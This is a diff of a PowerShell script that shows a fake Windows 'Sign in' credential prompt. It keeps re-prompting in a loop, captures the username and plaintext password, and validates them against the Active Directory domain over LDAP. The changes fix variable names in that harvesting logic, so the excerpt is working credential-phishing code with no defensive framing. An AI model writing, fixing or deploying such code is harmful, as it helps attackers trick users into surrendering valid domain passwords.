@@ -27,7 +27,7 @@ $options = [Windows.Security.Credentials.UI.CredentialPickerOptions]::new()
 $options.AuthenticationProtocol = 0
 $options.Caption = "Sign in"
 $options.Message = "Enter your credentials"
-
+$options.TargetName = "1"
 
 
 
@@ -41,7 +41,6 @@ function Await($WinRtTask, $ResultType) {
 
 
 function Credentials(){
-    $options.TargetName = "1"
     while ($status){
         
         # Where the magic happens
@@ -53,8 +52,8 @@ function Credentials(){
             Credentials
         }
         else {
-            $Username = $res.CredentialUserName;
-            $Password = $res.CredentialPassword;
+            $Username = $creds.CredentialUserName;
+            $Password = $creds.CredentialPassword;
             $CurrentDomain = "LDAP://" + ([ADSI]"").distinguishedName
 
             $domain = New-Object System.DirectoryServices.DirectoryEntry($CurrentDomain,$username,$password)
